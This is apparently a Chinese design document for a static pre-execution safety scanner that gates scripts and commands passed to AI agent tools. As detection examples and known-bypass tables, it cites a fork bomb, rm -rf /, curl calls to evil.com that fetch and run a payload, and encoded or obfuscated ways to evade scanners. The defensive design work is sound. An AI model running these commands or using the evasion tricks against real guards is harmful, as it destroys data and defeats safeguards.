# Tool Script Safety Guard — 设计说明

## 1. 目标与边界

Safety Guard 是**执行前治理层**。它对脚本、命令、参数、工作目录、环境变量
**名称**（绝不保留值）和 tool 元数据做静态检查，输出三级决策：`allow`（允许）、
`deny`（拒绝）或 `needs_human_review`（需人工复核）。

### 它是什么

- **静态、确定性、执行前的门禁**——在任何子进程、代码执行器或工具处理函数被调用
  之前运行。
- **策略驱动的扫描器**——YAML 策略文件独立控制白名单、黑名单、风险阈值和规则开关。
- **纵深防御的一层**——它补充但不替代进程隔离、网络出口控制和运行时资源限制。

### 它不是什么

- ❌ **沙箱**——不在隔离环境中执行代码。
- ❌ **运行时监控器**——不观察系统调用、ptrace、eBPF 或 seccomp 事件。
- ❌ **恶意软件扫描器**——不使用签名库、启发式或行为分析。
- ❌ **安全保证**——静态分析有固有的盲区（见第 5 节）。

---

## 2. 架构

### 2.1 三层扫描

```
                    SafetyScanner.scan(SafetyScanInput)
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
     ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
     │  第一层      │ │  第二层      │ │  第三层      │
     │  Python AST  │ │  Bash shlex  │ │  正则规则    │
     │  扫描器      │ │  扫描器      │ │  (6 类)      │
     └──────┬───────┘ └──────┬───────┘ └──────┬───────┘
            │                │                │
            └────────────────┼────────────────┘
                             ▼
              ┌──────────────────────────────┐
              │  按 (rule_id, line_number)   │
              │  去重                         │
              └──────────────┬───────────────┘
                             ▼
              ┌──────────────────────────────┐
              │  双层证据脱敏                  │
              └──────────────┬───────────────┘
                             ▼
              ┌──────────────────────────────┐
              │  策略驱动决策                  │
              │  + OTel 属性                  │
              │  + JSONL 审计事件             │
              └──────────────────────────────┘
```

**第一层 — Python AST 扫描器**（`_python_scanner.py`，约 910 行）

- 使用 `ast.parse()` 构建完整语法树。
- **导入别名解析**：`from os import system as s` → `s("id")` 解析为
  `os.system("id")`。
- **调用名解析**：遍历 `ast.Attribute` 链生成点分隔的规范名称
  （如 `requests.api.get`）。
- **污点追踪**：从 `os.environ["KEY"]`、`os.getenv()` 或凭据文件 `open()` 的
  赋值标记变量为"污点"。污点变量流入 `print()`、`logging.*`、`open(path, "w")`
  或网络调用时产生 `secret_in_output` 发现。
- **`getattr(__import__("os"), "system")("id")`** 被检测为动态执行。
- **路径链重构**：`Path("~") / ".ssh" / "id_rsa"` 被组装为 `"~/.ssh/id_rsa"`。

**第二层 — Bash 标记扫描器**（`_bash_scanner.py`，约 680 行）

- 使用 `shlex.shlex(punctuation_chars=True)` 进行标点感知的标记化。
- **引号状态跟踪**：区分 `'…'` 和 `"…"` 内的字符串与可执行标记。
  `echo 'rm -rf /'` 不会被标记。
- **行内注释剥离**：引号外的 `#` 终止该行的扫描。
- **基于标记的 rm -rf 检测**：检查 `-r`/`-R`/`--recursive` 和 `-f`/`--force`
  标记是否同时存在，无论顺序如何（`rm -r -f` 和 `rm -f -r` 都会捕获）。
- **Fork 炸弹检测**：字面量 `:(){ :|:& };:` 和泛化正则
  `NAME(){ NAME|NAME& };NAME` 两种模式。
- **dd 输出设备和大量写入检测**：解析 `of=`、`bs=`、`count=` 参数。
- **长睡眠解析**：`sleep 2h` → 7200 秒，与策略阈值比较。
- **敏感变量引用检测**：`echo $API_KEY`、`printf "%s" "$TOKEN"`。

**第三层 — 正则规则**（`_rules.py`，约 780 行）

- 六个内置规则类覆盖全部强制类别。
- 规则配置完全由 YAML 驱动（启用/禁用、风险级别、函数模式、命令列表）。
- **可插拔**：`register_rule(callable)` 添加自定义规则，与内置六类一起运行。
- 每条规则独立 `try/except` 保护——单条规则失败不会影响其他。

### 2.2 核心类

| 类 | 模块 | 职责 |
|----|------|------|
| `SafetyScanner` | `_scanner.py` | 编排器：运行三层扫描、去重、应用策略、返回 `SafetyScanReport` |
| `PythonScanner` | `_python_scanner.py` | AST 遍历器：收集 `PythonScanFinding` 对象 |
| `BashScanner` | `_bash_scanner.py` | 标记扫描器：收集 `BashScanFinding` 对象 |
| `DangerousFileOpsRule` | `_rules.py` | 正则层：文件操作 |
| `NetworkEgressRule` | `_rules.py` | 正则层：网络 |
| `ProcessAndSystemRule` | `_rules.py` | 正则层：进程 |
| `DependencyInstallRule` | `_rules.py` | 正则层：依赖 |
| `ResourceAbuseRule` | `_rules.py` | 正则层：资源 |
| `SensitiveInfoLeakRule` | `_rules.py` | 正则层：敏感信息 |
| `SafetyPolicy` | `_policy.py` | YAML → 数据类 + 白名单/黑名单辅助方法 |
| `AuditLogger` | `_audit.py` | 线程安全的 JSONL 写入器 |
| `ToolSafetyFilter` | `_safety_filter.py` | tRPC-Agent `BaseFilter` 集成 |
| `SafetyWrapper` | `_safety_wrapper.py` | 独立封装 + 装饰器 + 异步上下文管理器 |
| `ReportGenerator` | `_report.py` | JSON 序列化 |
| `set_safety_span_attributes` | `_telemetry.py` | OTel span 属性写入 |

### 2.3 决策流水线

```
三层扫描的全部发现
        │
        ▼
┌──────────────────────┐
│ max(risk_level)      │ ← 所有发现中的最高严重级别
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ policy.decision_for  │ ← 通过 YAML 阈值将 risk_level 映射为 Decision
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 黑名单覆盖            │ ← 如果任何黑名单正则匹配 → DENY（始终优先）
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 允许模式检查          │ ← 如果 allow_pattern 匹配且当前
│                      │   为 NEEDS_HUMAN_REVIEW → ALLOW
│                      │   不会覆盖 DENY（黑名单始终优先）
└──────────┬───────────┘
           ▼
       最终决策
```

**关键约束**：黑名单模式始终升级为 DENY，即使基于风险级别的决策是 ALLOW。
允许模式仅将 NEEDS_HUMAN_REVIEW 升级为 ALLOW，不会覆盖任何 DENY 决策
（无论是来自风险级别判定还是黑名单命中）。

---

## 3. 与其他子系统的关系

### 3.1 沙箱 / 容器隔离

```
┌─────────────────────────────────────────────────┐
│                    纵深防御                       │
│                                                   │
│  ┌─────────────┐     ┌──────────────────┐        │
│  │ Safety Guard │ ──▶│  进程沙箱         │        │
│  │ （静态）     │     │  （运行时）       │        │
│  │ 执行前       │     │  执行中           │        │
│  └─────────────┘     └──────────────────┘        │
│         │                      │                  │
│         ▼                      ▼                  │
│   捕获明显的危险：        捕获运行时危险：          │
│   rm -rf /、             实际系统调用、            │
│   curl evil.com、        文件描述符操作、           │
│   硬编码密钥              网络连接                  │
│                                                   │
│  ⚠️  Guard 不能替代沙箱：                          │
│  - 混淆代码可以绕过静态分析                         │
│  - 运行时行为可能与源码不同                         │
│  - 导入/下载的代码不被扫描                          │
│  - 侧信道（时序、文件系统）不覆盖                    │
└─────────────────────────────────────────────────┘
```

### 3.2 Filter 管线

`ToolSafetyFilter` 设计为 tRPC-Agent filter 链中的**终端授权过滤器**：

```
请求 → [参数过滤器] → [工具回调] → [ToolSafetyFilter] → 处理函数
                                         │
                              ┌──────────┴──────────┐
                              │  DENY → is_continue │
                              │  = False，处理函数   │
                              │  永远不会被调用      │
                              └─────────────────────┘
```

其他过滤器可能在安全检查前转换参数；安全检查器看到的是**最终**会到达处理函数的
参数。如果执行被阻止，过滤器向 LLM 返回结构化 JSON 错误，而不是抛出未处理的异常。

### 3.3 Telemetry / OpenTelemetry

- 每次扫描后，Guard 在当前的 OTel span 上设置 8 个 `tool.safety.*` 属性，
  无论决策如何。
- 这是**尽力而为**的：如果 OTel 未安装、没有活跃 span、或 `set_attribute` 抛出
  异常，Guard 静默继续。
- **安全决策永远不依赖遥测可用性**。

### 3.4 CodeExecutor

`SafetyWrapper` 和 `@safety_wrapper` 装饰器可以包裹任何 `BaseCodeExecutor` 实现。
封装器在委托给内部执行器之前扫描每个 `CodeBlock`。当决策为 `deny` 时，内部执行器
**不会被调用**——结果对象包含 Guard 的发现列表。

---

## 4. 集成方式总览

| 集成点 | 机制 | 阻断行为 |
|--------|------|----------|
| **CLI** | `scripts/tool_safety_check.py` | deny 时退出码为 2 |
| **直接 API** | `SafetyScanner.scan()` / `quick_scan()` | 返回 `SafetyScanReport` |
| **Filter** | `ToolSafetyFilter._before()` | 设置 `rsp.is_continue = False` |
| **Wrapper** | `SafetyWrapper.check()` | 抛出 `SafetyDeniedError` |
| **装饰器** | `@safety_wrapper` | 抛出 `SafetyDeniedError` |
| **异步 CM** | `async with wrapper.guard(script)` | 抛出 `SafetyDeniedError` |

---

## 5. 已知限制与绕过风险

### 5.1 Python — AST 无法检测的情况

| 绕过技术 | 状态 |
|----------|------|
| `eval(base64.b64decode("…"))` | 部分——`eval()` 被检测，但解码后的内容不被分析 |
| `chr(111)+chr(115)+".system"("id")` | ❌ 未检测——字符级混淆无法解析 |
| `__builtins__.__dict__['eval']("…")` | ❌ 未检测——基于字典的分发 |
| `globals()['__builtins__']['eval']("…")` | ❌ 未检测 |
| 动态 `importlib.import_module(user_input)` | ⚠️ `importlib` 被检测，但不扫描导入的模块 |
| `ctypes.CDLL("libc.so.6").system(b"id")` | ⚠️ `ctypes` 被正则标记，但实际调用未被解析 |

### 5.2 Bash — shlex 无法检测的情况

| 绕过技术 | 状态 |
|----------|------|
| `$(echo cm0gLXJmIC8= \| base64 -d)` | ⚠️ `$()` 被标记，但解码后的命令不被分析 |
| `eval $ENCODED` | ⚠️ `eval` 被检测，但变量内容不被扫描 |
| `. <(curl -s evil.com/payload.sh)` | ⚠️ 进程替换不被完全分析 |
| 带内联执行的 Heredoc | ⚠️ 标记为 `heredoc`，但内容不被递归扫描 |
| `$'\x72\x6d\x20\x2d\x72\x66'` (ANSI-C 引用) | ❌ 未检测 |

### 5.3 跨语言限制

- **多阶段攻击**：20 个各自安全的脚本组合成的攻击不会被检测。扫描器是**无状态的**——
  每次 `scan()` 调用独立。
- **下载/导入的代码**：`import evil_module`——只有 import 语句被扫描，模块源码被忽略。
- **混合语言文件**：同时包含 Python 和 Bash 的脚本可能只被一种语言的规则扫描。

### 5.4 结构性限制

- **无控制流或数据流分析**：扫描器无法判断危险代码行是否可达。
  `if False: os.system("id")` 仍然会被标记。
- **无运行时行为观察**：扫描器无法知道命令是否真的写入了敏感路径，只能判断源码
  中包含可能这样做的模式。
- **策略文件变更需重启**：没有热加载文件监视器（但可通过编程方式调用
  `reload_policy()`）。

---

## 6. 扩展 Guard

### 添加新的正则规则

1. 创建一个带有 `__call__(self, script, scan_input, policy) → list[SafetyFinding]`
   的可调用类。
2. 注册：`register_rule(MyNewRule())`。
3. 在 YAML 的 `rules.my_new_rule` 下添加对应配置。

### 添加新的 AST 检查

1. 在 `_python_scanner.py` 中将规范名称添加到对应集合（如 `_NETWORK_CALLS`、
   `_PROCESS_CALLS`）。
2. 在 `_scanner.py._scan_python_ast()` 中添加处理逻辑，将 `PythonScanFinding`
   转换为 `SafetyFinding`。

### 添加新的 Bash 检查

1. 在 `_bash_scanner.py` 中将命令名添加到对应集合（如 `_NETWORK_COMMANDS`、
   `_INSTALL_COMMANDS`）。
2. 在 `_scanner.py._scan_bash_tokens()` 中添加处理逻辑，将 `BashScanFinding`
   转换为 `SafetyFinding`。

---

## 7. 数据隐私

Guard 设计上**永不在持久存储中保存原始脚本、环境变量值或命令参数**：

| 输出通道 | 保存内容 |
|----------|----------|
| `SafetyScanReport`（JSON） | 证据片段（≤500 字符，已脱敏）、规则 ID、决策 |
| 审计 JSONL | `tool_name`、`decision`、`risk_level`、`rule_ids`、`scan_id`、`duration`、`sanitized`、`execution_blocked`——**无脚本内容、无环境变量值** |
| OTel span 属性 | 8 个低基数字符串——**无脚本内容、无环境变量值** |
| Python 日志 | 审计事件 JSON 字符串 |

**脱敏层**：
1. 正则 key=value 遮蔽：`api_key=***REDACTED***`
2. PEM 私钥块检测：`-----BEGIN ***REDACTED*** PRIVATE KEY-----`
3. JWT / API Key 格式检测：`sk-...` → `sk-***REDACTED***`
4. 证据截断：超过 320 字符 → `…<truncated:N>`

---

## 8. 测试与验证

- **121 个单元 + 集成 + 端到端测试** 在 `tests/test_tool_safety.py`
- **16 个验收测试** 覆盖 12 个强制场景，外加 AST 混淆检测和白名单正确性验证
- **性能基准**：500 行脚本扫描 ≤ 1 毫秒（提前返回）或 < 1 秒（完整扫描）
- **验收标准验证**：
  - 高危检出率：100%（3/3 必检类别）
  - 安全样本误报率：0%（`print("hello")` 零发现）
  - 凭据/删除/非白名单网络三类：100% 检出

---

## 9. 为什么不能替代沙箱隔离

静态分析操作的是**源代码**而非**运行时行为**。控制脚本内容的攻击者可以：

1. **混淆**到扫描器解析能力之外（base64、chr 拼接、十六进制编码、ANSI-C 引用）。
2. **下载并执行**扫描器从未见过的代码（多阶段攻击）。
3. **利用竞态条件**或**侧信道**，这些只在运行时显现。
4. **使用看似无害的原语**（如 `open("/proc/self/mem")`），静态模式不覆盖。

**Guard 是第一道防线。生产部署还必须：**

- 在隔离容器或沙箱中运行工具（gVisor、Firecracker、Docker with
  `--read-only --no-new-privileges --cap-drop=ALL`）。
- 应用网络出口控制（仅允许白名单域名，禁止原始 socket）。
- 除显式临时目录外，以只读方式挂载文件系统。
- 设置每进程资源限制（CPU、内存、文件描述符、最大 PID 数）。
- 启用操作系统级审计日志（auditd、syslog）。
- 轮转和监控审计日志。
